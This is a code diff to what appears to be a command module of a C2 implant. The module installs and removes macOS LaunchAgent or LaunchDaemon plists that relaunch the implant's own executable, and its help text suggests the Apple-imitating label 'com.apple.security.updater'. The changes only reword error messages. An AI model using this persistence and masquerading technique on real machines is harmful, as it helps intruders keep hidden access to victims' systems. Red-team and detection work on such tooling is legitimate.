@@ -34,7 +34,7 @@ type launchAgentArgs struct {
 
 func (c *LaunchAgentCommand) Execute(task structs.Task) structs.CommandResult {
 	if task.Params == "" {
-		return errorResult("Error: parameters required. Use action: install, remove, list")
+		return errorResult("parameters required. Use action: install, remove, list")
 	}
 
 	args, parseErr := unmarshalParams[launchAgentArgs](task)
@@ -71,7 +71,7 @@ func getPlistDir(daemon bool) (string, error) {
 // launchAgentInstall creates a LaunchAgent or LaunchDaemon plist
 func launchAgentInstall(args launchAgentArgs) structs.CommandResult {
 	if args.Label == "" {
-		return errorResult("Error: label is required (e.g., com.apple.security.updater)")
+		return errorResult("label is required (e.g., com.apple.security.updater)")
 	}
 
 	// Default to current executable if no path specified
@@ -79,19 +79,19 @@ func launchAgentInstall(args launchAgentArgs) structs.CommandResult {
 	if programPath == "" {
 		exe, err := os.Executable()
 		if err != nil {
-			return errorf("Error getting executable path: %v", err)
+			return errorf("getting executable path: %v", err)
 		}
 		programPath = exe
 	}
 
 	plistDir, err := getPlistDir(args.Daemon)
 	if err != nil {
-		return errorf("Error: %v", err)
+		return errorf("failed to determine plist directory: %v", err)
 	}
 
 	// Ensure the directory exists
 	if err := os.MkdirAll(plistDir, 0755); err != nil {
-		return errorf("Error creating directory %s: %v", plistDir, err)
+		return errorf("creating directory %s: %v", plistDir, err)
 	}
 
 	plistPath := filepath.Join(plistDir, args.Label+".plist")
@@ -107,7 +107,7 @@ func launchAgentInstall(args launchAgentArgs) structs.CommandResult {
 	plist := macBuildPlist(args.Label, programArgs, args.RunAt, args.Interval)
 
 	if err := os.WriteFile(plistPath, []byte(plist), 0644); err != nil {
-		return errorf("Error writing plist: %v", err)
+		return errorf("writing plist: %v", err)
 	}
 
 	// Determine type description
@@ -131,18 +131,18 @@ func launchAgentInstall(args launchAgentArgs) structs.CommandResult {
 // launchAgentRemove removes a LaunchAgent or LaunchDaemon plist
 func launchAgentRemove(args launchAgentArgs) structs.CommandResult {
 	if args.Label == "" {
-		return errorResult("Error: label is required to identify the plist to remove")
+		return errorResult("label is required to identify the plist to remove")
 	}
 
 	plistDir, err := getPlistDir(args.Daemon)
 	if err != nil {
-		return errorf("Error: %v", err)
+		return errorf("failed to determine plist directory: %v", err)
 	}
 
 	plistPath := filepath.Join(plistDir, args.Label+".plist")
 	secureRemove(plistPath)
 	if _, err := os.Stat(plistPath); err == nil {
-		return errorf("Error removing %s: file still exists", plistPath)
+		return errorf("removing %s: file still exists", plistPath)
 	}
 
 	plistType := "LaunchAgent"
